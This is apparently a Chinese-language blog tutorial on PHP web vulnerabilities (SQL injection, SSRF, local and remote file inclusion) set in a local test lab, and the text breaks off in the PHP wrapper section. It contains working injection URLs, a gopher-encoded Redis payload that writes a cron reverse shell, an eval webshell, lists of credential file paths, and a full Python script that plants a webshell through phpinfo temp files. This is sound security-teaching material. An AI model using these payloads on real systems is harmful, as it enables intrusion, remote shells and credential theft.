---
title: Web Security
date: 2018-11-13 20:34:02
---

以PHP讲解常见WEB安全漏洞<!-- more -->

## SQL Injection

**0x01 相关背景介绍**
结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。
1986年10月，美国国家标准学会对SQL进行规范后，以此作为关系式数据库管理系统的标准语言（ANSI X3. 135-1986），1987年得到国际标准组织的支持下成为国际标准。
不过各种通行的数据库系统在其实践过程中都对SQL规范作了某些编改和扩充。所以，实际上不同数据库系统之间的SQL不能完全相互通用。

SQL注入（SQL Injection）是一种常见的Web安全漏洞，攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。

**0x02 成因**
针对SQL注入的攻击行为可描述为：通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：

1. 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句
2. 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中


**0x03 攻击方式和危害**

3.1 攻击方式
SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为可显注入、报错注入和盲注：

* 可显注入：攻击者可以直接在当前界面内容中获取想要获得的内容
* 报错注入：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容
* 盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容

3.2危害
危害根据Web应用程序连接数据库的用户权限决定。

root权限(可直接写Shell，跨库注入等，MSSQL SA权限 甚至可直接提权拿服务器)

普通用户权限(读取该用户所属数据库的信息)


**下面以Mysql数据库来讲解SQL注入。**

1.首先准备环境

测试环境为(若无特别声明，以下所有注入操作均在此环境下执行)，

PHP Version 5.3.29
Windows10
Mysql 5.5.40
Apache/2.4.10 (Win32) 

2.准备一个查询数据库的Demo。

``` PHP
//sqli.php
<?php
header("Content-type: text/html; charset=utf-8");

$id = $_GET['id'];
$conn = mysqli_connect("localhost", "test","test","test");

if (!$conn){
	die("Database Connection failed: " . mysqli_connect_error());
}

$sql = "select * from test where id = $id";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0){
	while($row = mysqli_fetch_assoc($result) ){
		echo 'user_id: ' . $row['id']."<br />";
		echo 'user: ' . $row['username']."<br />";
	}
	
}else{
	echo "check Sql";
}

echo "执行的sql语句: $sql";

mysqli_close($conn);
?>
```

3.准备数据
![Demodata](Web/Demodata.png)


### UNION query-based
---

Mysql数据库结构
```
Mysql
    -A  数据库A
		—table1
			-columns1
				-data
			-columns2
				-data
			-columns3
				....
			-columns4
		-table2
			-columns1
			-columns2
			-columns3
			-columns4			-
		-table3	
			-columns1
			-columns2
			-columns3
			-columns4
	-B  数据库B
		—table1
			-columns1
			-columns2
			....
	-C  数据库B
		—table1
			-columns1
			-columns2
			....
[*]小结：
1.Mysql数据库中有很多数据库，每个数据库里面又有很多的表，每个表中又有很多列，数据存放在列下面，
2.查询数据时，通过指定数据库，表，列名，找到存储的数据。
```

先来看一下Mysql的一些函数。
Version()  查询当前Web应用程序所使用的数据库版本
user()  查询当前Web应用程序所连接的用户名
database() 查询当前Web应用程序所使用的数据库名

information_schema 这个数据库包含了Mysql数据库里面所有的数据库，所有的表，所有的列，(Mysql5.0版本以上才有information_schema)

information_schema.schemata schemata表存储mysql下所有的数据库
符号"."代表下一级的意思代表下一级的意思，information_schema数据库下面的schemata表，
information_schema.tables  tables表存储mysql下所有的表名
information_schema.columns columns表存储mysql下所有的列名
table_schema 表名来自哪个数据库
Column_name 列名
Table_name  表名
Schema_name 数据库名

打开sqli.php
[127.0.0.1/sqli.php?id=1](127.0.0.1/sqli.php?id=1)

![mysqlinjection1](Web/mysqlinjection1.png)

ok，接下来我们怎么去利用，进而查询到我们数据库中存储的password数据呢?

在Mysql中，有一种查询叫做联合查询，Union
UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中.
在我们使用UNION查询的时候，UNION后面的select查询语句查询的列数个数要与前面的列数数量一致。
![mysqlunion1](Web/mysqlunion1.png)

如何获得Web应用程序查询的列数呢？可以通过order by num获得
![mysqlorderby](Web/mysqlorderby.png)
num表示表中列的位置，最左边的列是1。

![mysqlorderby1](Web/mysqlorderby1.png)
当order by 3时，Mysql查询出错，因为查询结果中没有第三行的列，由此我们可以知道，列数为2.

对sqli.php继续注入

![mysqlorderby2](Web/mysqlorderby2.png)

![mysqlorderby3](Web/mysqlorderby3.png)

当我们执行order by 4 的时候，Web应用程序出错了，可得列数没有第四列。那么当前应用程序连接的数据库的字段数就是3个。

接着使用UNION联合查询，报出了数字1，2，因为1，2是回显在页面上，因此我们可以在1，2上注入，结果也将显示到页面上。
![mysqlunion2](Web/mysqlunion2.png)

首先我们来判断数据库的版本，来理清渗透思路。(Mysql5.0以上是根据information_schema数据库进行的注入，而Mysql5.0以下则数据暴力猜解，没有依据。)
![mysqlunion3](Web/mysqlunion3.png)

接着继续查询连接当前数据库的数据库用户名，理清渗透思路。得知为普通用户，那么思路也就清晰了，注入数据库找后台账号密码。
![mysqlunion4](Web/mysqlunion4.png)

在讲解数据库结构时，提到，要想得到数据，要指定具体的数据库名，表，字段，因此接下来猜数据库名，接着找表，接着找列，最后猜数据。
![mysqlunion5](Web/mysqlunion5.png)

根据information_schema.tables表找表名。
![mysqlunion6](Web/mysqlunion6.png)

根据information_schema.columns表找列名
![mysqlunion7](Web/mysqlunion7.png)

爆数据
![mysqlunion8](Web/mysqlunion8.png)

limit限制输出行
![mysqlunion9](Web/mysqlunion9.png)

group_concat
![mysqlunion10](Web/mysqlunion10.png)


### Time-based blind

当Sql语句执行后，WEB应用程序不将数据返回前端展示时，可以通过盲注的方式获取我们想要的数据。

```
先来了解几个函数。
sleep(x) -- 延迟函数，延迟多少秒取决于x的值。
length(x) -- 查看x字符串的长度。
if(x,1,0) -- 判断函数，若x为真的执行1，假0.
mid(database(),start,length) -- mid函数用于得到一个字符串的一部分，例如mid(user,1,1)='u' 即 user 从1开始长度为1的字符是否等于u。
database() --查看当前使用的数据库名
Ascii（）--返回字符的ascii码
```

测试代码：
``` php
//sqli_blind.php
<?php
header("Content-type: text/html; charset=utf-8");
$id = $_GET['id'];
$conn = mysqli_connect("localhost", "root","root","test") or die("Database Connection failed: " . mysqli_connect_error());
if (isset($id)){
	$sql = "select * from lxhsec where id = '$id'";
	$result = mysqli_query($conn, $sql);
	if (mysqli_num_rows($result) > 0){
		echo '<pre>User ID exists in the database.</pre>';
		
	}else{
		echo '<pre>User ID is MISSING from the database.</pre>';
	}
	echo "执行的sql语句: $sql";
	mysqli_close($conn);
}else{
	echo 'please set id argument';
}
?>
```

判断注入
![sql_time_blind01](Web/sql_time_blind01.png)

判断数据库长度
```
http://127.0.0.1/sqli_blind.php?id=1' and if((length(database())>3),sleep(5),0)%23

分析: 
database() - 获取WEB应用程序当前连接的数据库名。
↓
length(database()) - 获取数据库名长度。
↓
(length(database())>3) - 数据库名的长度大于3。
↓
if((length(database())>3),sleep(5),0)

判断数据库长度是否大于3，若是，则延迟5秒，否则返回0.
```
![sql_time_blind02](Web/sql_time_blind02.png)


判断数据库名
```
http://127.0.0.1/sqli_blind.php?id=1' and if((ascii(mid(database(),1,1))=116),sleep(5),0)%23

分析:
mid(database(),1,1) - 截取数据库名第一个字符
↓
(ascii(mid(database(),1,1))=116)  - 第一个字符的ascii码等于116
↓
if((ascii(mid(database(),1,1))=116),sleep(5),0)

判断数据库名第一位的ascii是否等于116，若是，则延迟5秒，否则返回0.
```
![sql_time_blind03](Web/sql_time_blind03.png)

判断表名数量
```
http://127.0.0.1/sqli_blind.php?id=1' and if((ascii(mid((select count(table_name) from information_schema.tables where table_schema=database()),1,1))=50),sleep(5),0)%23
```
![sql_time_blind08](Web/sql_time_blind08.png)

判断表名长度
```
http://127.0.0.1/sqli_blind.php?id=1' and if((length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>=3),sleep(5),0)%23
```
![sql_time_blind07](Web/sql_time_blind07.png)


判断表名
```
http://127.0.0.1/sqli_blind.php?id=1' and if((ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=108),sleep(5),0)%23

分析:
(select table_name from information_schema.tables where table_schema=database() limit 0,1）- 查询WEB应用程序当前连接的数据库下的第一个表名。
↓
mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) - 截取表名的第一个字符。
↓
(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=108) - 判断表名的第一个字符的ascii码等于108
↓
if((ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=108),sleep(5),0)

判断WEB应用程序当前连接的数据库下第一个表名的第一个字符是否等于108，若是，则延迟5秒，否则返回0.
```
![sql_time_blind04](Web/sql_time_blind04.png)

判断字段名
```
http://127.0.0.1/sqli_blind.php?id=1' and if((ascii(mid((select column_name from information_schema.columns where table_name='lxhsec' limit 0,1),1,1))=105),sleep(5),0)%23

分析:
(select column_name from information_schema.columns where table_name='lxhsec' limit 0,1) - 查询WEB应用程序当前连接的数据库的lxhsec表的第一个字段名。
↓
mid((select column_name from information_schema.columns where table_name='lxhsec' limit 0,1),1,1) - 截取字段名的第一个字符。
↓
(ascii(mid((select column_name from information_schema.columns where table_name='lxhsec' limit 0,1),1,1))=105) - 字段名的第一个字符的ascii码等于105 
↓
if((ascii(mid((select column_name from information_schema.columns where table_name='lxhsec' limit 0,1),1,1))=105),sleep(5),0)

判断WEB应用程序当前连接的数据库下lxhsec表的第一个字段名的第一个字符是否等于108，若是，则延迟5秒，否则返回0.
```
![sql_time_blind05](Web/sql_time_blind05.png)

猜数据
```
http://127.0.0.1/sqli_blind.php?id=1' and if((ascii(mid((select id from test.lxhsec limit 0,1),1,1))=49),sleep(5),0)%23

分析:
(select id from test.lxhsec limit 0,1) - 查询test数据库下lxhsec表下id字段的第一行数据。
↓
mid((select id from test.lxhsec limit 0,1),1,1) - 截取id数据的第一个字符。
↓
(ascii(mid((select id from test.lxhsec limit 0,1),1,1))=49) - id数据的第一个字符的ascii码等于49
↓
if((ascii(mid((select id from test.lxhsec limit 0,1),1,1))=49),sleep(5),0)

判断WEB应用程序当前连接的数据库下lxhsec表的id字段的第一行数据的第一个字符是否等于49，若是，则延迟5秒，否则返回0.
```
![sql_time_blind06](Web/sql_time_blind06.png)




## SSRF（Server Side Request Forgery）

**0x01 前言**
SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。

**0x02 成因**
SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容、加载指定地址的图片、下载等。

**0x03 攻击类型**
1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。

2.攻击运行在内网或本地的应用程序(比如溢出)。

3.对内网web应用进行指纹识别，通过访问默认文件实现。

4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击(比如struts2，sqli等)。

5.利用file协议读取本地文件等。

**0x04 漏洞挖掘**
漏洞挖掘方法分为两种：

**从WEB功能上寻找**

---
常见WEB功能：

1）分享：通过URL地址分享网页内容

2）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览

3）在线翻译：通过URL地址翻译对应文本的内容。

4）图片加载与下载：通过URL地址加载或下载图片。

5）图片、文章收藏功能

**从URL关键字寻找**

---
常见URL关键字：

share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain


**0x05 利用方式**

测试代码：
``` PHP
//ssrf.php
<?php
// 创建一个新cURL资源
$ch = curl_init();

// 设置URL和相应的选项
curl_setopt($ch, CURLOPT_URL, $_GET['url']);

//CURLOPT_RETURNTRANSFER为TRUE时, curl_exec()获取的信息以字符串返回，而不是直接输出。
//curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 

// 当CURLOPT_RETURNTRANSFER为TRUE时, 函数执行成功时会返回执行的结果，失败时返回 FALSE 。
curl_exec($ch); // 执行
curl_close($ch);//关闭资源
?>
```
上述代码用来模拟ssrf，使用curl发起网络请求然后返回客户端，这里我请求加载百度，抓包可见并没有百度的数据包，因为请求并不是客户端发起的。
![ssrf1](Web/ssrf1.png)

curl支持的协议

![ssrf2](Web/ssrf2.png)

可以看到该版本的curl支持很多协议，其中gopher协议、dict协议、file协议、http/s协议用的比较多,


http/https:主要用来探测内网服务。根据响应的状态、内容等判断内网端口及服务.
`http://192.168.31.132/ssrf.php?url=http://192.168.31.91:81`

![ssrf3](Web/ssrf3.png)

除了http/https，还有一些可利用的协议如下:

file://

上述测试代码有回显，因此浏览器直接访问,就可以看到文件内容了。

```
http://192.168.31.132/ssrf.php?url=file:///E:/www/ssrf.php
```

![ssrf_file.png](Web/ssrf_file.png)


dict://

同理，看redis相关配置，直接访问

```
http://192.168.31.132/ssrf.php?url=dict://192.168.31.232:6379/info
```

![ssrf_dict.png](Web/ssrf_dict.png)

如果在测试代码中ssrf.php加上一行代码屏蔽回显，

	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 

那么dict只能通过NC 来获取Banner信息了，file协议则利用不了。

![dict_nodisplay.png](Web/dict_nodisplay.png)


Gopher:// - 拓展SSRF攻击面

Note: **使用Gopher前，必须要用dict协议探测Banner信息，从而确定curl的版本是否支持Gopher协议**

攻击内网Redis

首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 如下，将其保存为redis.sh。
```
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/24444 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
redis-cli -h $1 quit
```

Note: 实战时，redis-cli -h $1 flushall这一行可以去除，因为它将清除redis内的所有数据。

利用这个脚本攻击自身并抓包得到数据流，

1.首先在测试机开启redis-server，改服务运行端口为6378
`redis-server --port 6378`

2.使用socat抓取数据流，
`socat -v tcp-listen:6379,fork tcp-connect:localhost:6378`

意思是将本地的6379端口转发到本地的6378端口。访问该服务器的6379端口，访问的其实是该服务器的6378端口。


3.运行脚本
`bash redis.sh 127.0.0.1`

数据流如下：
```
root@kali:~# socat -v tcp-listen:6379,fork tcp-connect:localhost:6378
> 2019/03/02 08:43:17.023613  length=86 from=0 to=85
*3\r
$3\r
set\r
$1\r
1\r
$59\r



*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/24444 0>&1



\r
< 2019/03/02 08:43:17.024240  length=5 from=0 to=4
+OK\r
> 2019/03/02 08:43:17.037387  length=57 from=0 to=56
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$16\r
/var/spool/cron/\r
< 2019/03/02 08:43:17.037828  length=5 from=0 to=4
+OK\r
> 2019/03/02 08:43:17.041366  length=52 from=0 to=51
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$4\r
root\r
< 2019/03/02 08:43:17.043067  length=5 from=0 to=4
+OK\r
> 2019/03/02 08:43:17.058127  length=14 from=0 to=13
*1\r
$4\r
save\r
< 2019/03/02 08:43:17.071285  length=5 from=0 to=4
+OK\r
> 2019/03/02 08:43:17.076940  length=14 from=0 to=13
*1\r
$4\r
quit\r
< 2019/03/02 08:43:17.077113  length=5 from=0 to=4
+OK\r
```

上述数据流的写法是Redis 为了二进制数据安全而规定的协议。
Redis 规定如下：
- 每一行都要使用分隔符(CRLF)
- 一条命令用"`*`"开始，同时用数字作为参数，需要分隔符("*1"+ CRLF)
--我们有多个参数时：
- 字符：以"`$`"开头+字符的长度（"$4" + CRLF）+字符串("TIME"+CRLF) 即＂$4＂+CRLF + "TIME"+CRLF
- 整数：以"`:`"开头+整数的ASCII码(":42"+CRLF)


由于上述数据是数据流，因此需要转换成适配于Gopher协议的URL,如下.
转换规则为:
1.清楚Log消息。
2.将空行替换为%0a，
3.将\r替换成%0d%0a,如果只有\r，将\r替换成%0a%0d%0a

替换脚本如下：
``` python
# coding: utf-8
import sys
from urllib.parse import quote

payload = ''
with open(sys.argv[1]) as f:
    for line in f.readlines():
        if line[0] in '><+':
            continue
        elif line[-3:-1] == r'\r':
            payload += '%0a%0d%0a' if len(line) == 3 else line.replace(r'\r', '%0d%0a').replace('\n', '')
        elif line == '\x0a':
            payload += '%0a'
        else:
            payload += line.replace('\n', '')
print(payload)
```

gopher协议GET使用方法为：gopher://ip:port/_payload

payload如下：
```
gopher://192.168.31.91:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$59%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/24444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```
需要注意，如果要更改生成的payload，则需重新计算个数。
例如，想将ip更换为192.168.1.10，那么需要将$59更改为$62.
$59代表的是,3+52+4=59
`%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/24444 0>&1%0a%0a%0a%0a`


本地测试：
![ssrf_redis1](Web/ssrf_redis1.png)

利用SSRF攻击：

需要对payload再次编码，
![ssrf_redis.png](Web/ssrf_redis2.png)

攻击：
![ssrf_redis.png](Web/ssrf_redis.png)

SSRF攻击其他漏洞：
```
网络服务探测
ShellShock命令执行
JBOSS远程Invoker war命令执行
Java调试接口命令执行
axis2-admin部署Server命令执行
Jenkins Scripts接口命令执行
Confluence SSRF
Struts2一堆命令执行
counchdb WEB API远程命令执行
mongodb SSRF
docker API远程命令执行
php_fpm/fastcgi 命令执行
tomcat命令执行
Elasticsearch引擎Groovy脚本命令执行
WebDav PUT上传任意文件
WebSphere Admin可部署war间接命令执行
Apache Hadoop远程命令执行
zentoPMS远程命令执行
HFS远程命令执行
glassfish任意文件读取和war文件部署间接命令执行
```


除了curl_exec之外，还有file_get_contents，fsockopen等函数，使用不当都可以造成SSRF漏洞，示例代码如下:

file_get_contents:

``` PHP
<?php
	$url = $_GET['url'];	
	echo file_get_contents($url);
?>
```
![ssrf5](Web/ssrf5.png)


fsockopen：
``` php
<?php
	function request($host,$port,$link)
	{
	    $fp = fsockopen($host, $port, $err_no, $err_str, 30);
	    $out = "GET $link HTTP/1.1\r\n";
	    $out .= "Host: $host\r\n";
	    $out .= "Connection: Close\r\n\r\n";
	    $out .= "\r\n";
	    fwrite($fp, $out);
	    $contents='';
	    while (!feof($fp)) {
	        $contents.= fgets($fp, 1024);
	    }
	    fclose($fp);
	    return $contents;
	}
	echo request($_GET['host'], $_GET['port'], $_GET['url']);
?>
```
![ssrf4](Web/ssrf4.png)


0x06 漏洞修复

* 限制协议为HTTP、HTTPS
	`curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);`
* 禁止301跳转
	`curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);`
* 设置URL白名单或者限制内网IP
```
	$url = $_GET['url'];
	$white_list_urls = [
	 'www.xxx1.com',
	 'www.xxx2.com'
	]
	if (in_array(parse_url($url)['host'], $white_list_urls)){
	 echo curl($url);
	} else {
	 echo 'URL not allowed';
	}
```

## 文件包含（File include）

服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。
如果被包含的文件中无有效的php代码，则会直接把文件内容输出。

**文件包含函数**
PHP中文件包含函数有以下四种：
```
require()
require_once()
include()
include_once()

include和require区别主要是，
include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；
而require函数出现错误的时候，会直接报错并退出程序的执行。

include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，
适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。
```

**漏洞产生原因**
文件包含函数加载的参数没有经过过滤，可以被用户控制。

示例代码
``` PHP
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```
例如：
include函数加载的filename参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改filename参数的值，执行非预期的操作。


### **本地文件包含漏洞**

无限制本地包含漏洞
测试代码：
``` PHP
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```
测试结果：
![include1](Web/include1.png)

可以根据敏感文件的默认路径进行读取。
常见的敏感信息路径：

Windows系统
```
c:\boot.ini // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

c:\windows\repair\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信息
```

Linux/Unix系统
```
/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件
```

**利用Apache日志**
```
apache日志分为access.log与error.log，
当我们请求一个Web应用程序url地址时，便会记录在access.log中，
但是写入到access.log文件中url是被编码的，
所以需要抓包绕过,且需要知道access.log的地址,才能配合文件包含漏洞。
```
![Apache_log_LFI](Web/Apache_log_LFI.png)

用burp抓包写，绕过编码。
![Apache_log_LFI](Web/Apache_log_LFI1.png)

![Apache_log_LFI](Web/Apache_log_LFI2.png)


[Apache默认配置文件路径](https://wiki.apache.org/httpd/DistrosDefaultLayout)

**session文件包含漏洞**
利用条件：
1.session的存储位置可以获取。
2.session中的内容可以被用户控制，传入恶意代码。

1.1.通过phpinfo的信息可以获取到session的存储位置。

通过phpinfo的信息，获取到session.save_path为C:\Program Files\phpStudy\tmp\tmp;
![Session_include1](Web/Session_include1.png)

1.2.通过猜测默认的Session存放位置进行尝试。

```
Linux：
/tmp 或 /var/lib/php/session

Windows：
C:\WINDOWS\Temp
```

测试代码：
``` PHP
<?php
	session_start();
	$_SESSION["username1"]=$_GET['user'];
?>
```

测试结果:
![Session_include2](Web/Session_include2.png)

```
1.session的文件格式为sess_+PHPSESSID,PHPSESSID可以抓取请求数据包获得。
2.在名为sess_+PHPSESSID文件中，会存储$_SESSION["username"]的键，以及值(值是用户可以控制的，攻击者可以插入任意代码。)。
```
利用：攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。(前提是你能够控制session的值)
![Session_include3](Web/Session_include3.png)

**临时文件包含**

向服务器上任意php文件post请求 上传文件时，都会生成临时文件，可以直接在phpinfo页面找到临时文件的路径及名字。

在HTTP协议中为了方便进行文件传输，规定了一种基于表单的 HTML文件传输方法

其中要确保文件上传表单的属性是 enctype="multipart/form-data"，否则文件上传不了。

PHP引擎对enctype="multipart/form-data"这种请求的处理过程如下：

1.请求到达
2.创建临时文件，并写入上传文件的内容
3.调用相应PHP脚本进行处理，如校验名称、大小等
4.删除临时文件

PHP引擎会首先将文件内容保存到临时文件，然后进行相应的操作。
临时文件的名称是 php+随机字符。

在PHP中，有超全局变量$_FILES,保存上传文件的信息，包括文件名、类型、临时文件名、错误代号、大小等。

1.手工测试phpinfo()获取临时文件路径

文件 upload.html
```
<!doctype html>
<html>
<body>
    <form action="phpinfo.php" method="POST" enctype="multipart/form-data">
    <h3> Test upload tmp file</h3>
    <label for="file">Filename:</label>
    <input type="file" name="file"/><br/>
    <input type="submit" name="submit" value="Submit" />
</form>
</body>
</html>
```

浏览器访问 upload.html, 上传文件 file.txt
```
//file.txt
<?php @eval($_POST['a']);?>
```

跳转到phpinfo页面，可以看到临时文件信息,得到tmp_name 路径。
![phpinfoinclude](Web/phpinfoinclude.png)

当我们去此路径看的时候，会发现文件不存在，是因为php已经完成了它对上传文件的操作，已经删除了临时文件，因此我们手工的去包含，速度上来说肯定是不够的。

网上随便找了个dalao的脚本，改了个python3，代码如下：

``` python
#coding: utf-8

'''
可能需要你改的几个地方：
1、host
2、port
3、request中的phpinfo页面名字及路径
4、hello_lfi() 函数中的url，即存在lfi的页面和参数
5、如果不成功或报错，尝试增加padding长度到7000、8000试试
6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改
 Good Luck :)

'''
import re
import requests
import hashlib
from socket import *
import time 

host = '127.0.0.1'
port = 80
# t = int(time.time())
shell_name = hashlib.md5(host.encode('utf-8')).hexdigest() + '.php'
pattern = re.compile(r'''\[tmp_name\]\s=&gt;\s(.*)\W*error]''')

payload = '''idwar<?php fputs(fopen('./''' + shell_name + '''\',"w"),"idwar was here<?php eval(\$_POST[a]);?>")?>\r'''
req = '''-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r''' % payload

padding='A' * 7000
request='''POST /phpinfo.php?a='''+padding+''' HTTP/1.0\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie='''+padding+'''\r
HTTP_ACCEPT: ''' + padding + '''\r
HTTP_USER_AGENT: ''' + padding + '''\r
HTTP_ACCEPT_LANGUAGE: ''' + padding + '''\r
HTTP_PRAGMA: ''' + padding + '''\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s''' % (len(req), host, req)


def hello_lfi():
    while 1:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((host, port))
        s.send(request.encode())
        data = ''
        while r'</body></html>' not in data:
            data = s.recv(9999).decode('utf8')
            search_ = re.search(pattern, data)
            if search_:
                tmp_file_name = search_.group(1)
                # url = r'http://127.0.0.1/fileinclude.php?filename=%s%%00' % tmp_file_name
                url = r'http://127.0.0.1/fileinclude.php?filename=%s' % tmp_file_name
                print(url)
                html_data = requests.get(url).text
                if 'idwar' in html_data:
                    s.close()
                    return '\nDone. Your webshell is : \n\n%s\n' % ('http://' + host + '/' + shell_name)
        s.close()

if __name__ == '__main__':
    print (hello_lfi())
    print ('\n Good Luck :)')

```

测试结果:
![phpinfoinclude2](Web/phpinfoinclude2.png)



**有限制本地文件包含漏洞绕过**

%00截断
条件：magic_quotes_gpc = Off  php版本<5.3.4

%00 空字符，magic_quotes_gpc为On的情况下会将空字符进行转义，导致漏洞利用失败。php 5.3.4之后修复了这一漏洞。

测试代码：
``` PHP
<?php
    $filename  = $_GET['filename'];
    include($filename . ".html");
?>
```
测试结果
![include2](Web/include2.png)

用Burp Fuzz 发现只有%00才能截断。
![include3](Web/include3.png)

路径长度截断
条件：php版本小于5.3可以成功（my 5.3版本测试失败），windows OS，参数值总长度需要长于255；linux OS 长于4095

Windows下目录最大长度为255字节，超出的部分会被丢弃；

Linux下目录最大长度为4095字节，超出的部分会被丢弃。

测试代码：
``` PHP
<?php
    $filename  = $_GET['filename'];
    include($filename . ".html");
?>
```

EXP:
```
http://127.0.0.1/testinclude.php?filename=phpinfo.php././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
```
![Web/include6.png](Web/include6.png)

![Web/include7.png](Web/include7.png)

点号截断
条件：php版本小于5.3可以成功，windows OS，参数值总长度需要长于255
测试代码：
``` PHP
<?php
    $filename  = $_GET['filename'];
    include($filename . ".html");
?>
```

EXP: 
```
http://127.0.0.1/testinclude.php?filename=phpinfo.php................................................................................................................................................................................................................................................
```
![include4](Web/include4.png)

![include5](Web/include5.png)


目录遍历绕过固定目录
测试代码：
![include8](Web/include8.png)

测试结果：
![include9](Web/include9.png)


### **远程文件包含漏洞**

PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，
如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。
```
条件：
allow_url_fopen = On（是否允许打开远程文件）
allow_url_include = On（是否允许include/require远程文件）
```

无限制远程文件包含漏洞
测试代码：
``` PHP
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```
测试结果:
![url_include1](Web/url_include1.png)

有限制远程文件包含漏洞绕过
测试代码:
``` PHP
<?php
    $filename  = $_GET['filename'];
    include($filename.".html");
?>
```
多增加.html后缀
![url_include2](Web/url_include2.png)


问号绕过

原理，HTTP协议中，问号后面的代表参数。
![url_include3](Web/url_include3.png)

Burp Fuzz 结果如下，#,?,空格,空字符都可以绕过。
![url_include4](Web/url_include4.png)

### **PHP伪协议**

PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。

![php_protocol1](Web/php_protocol1.png)


#### file:// — 访问本地文件系统

通过file协议可以访问本地文件系统，读取到文件的内容，不受allow_url_fopen与allow_url_include的影响

php.ini

allow_url_fopen ：off/on
allow_url_include：off/on

测试代码：
``` PHP
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```
![php_protocol_file](Web/php_protocol_file.png)


#### http(s):// — 访问 HTTP(s) 网址（相当于远程文件包含）

#### php:// - 访问各个输入/输出流（I/O streams）

PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入
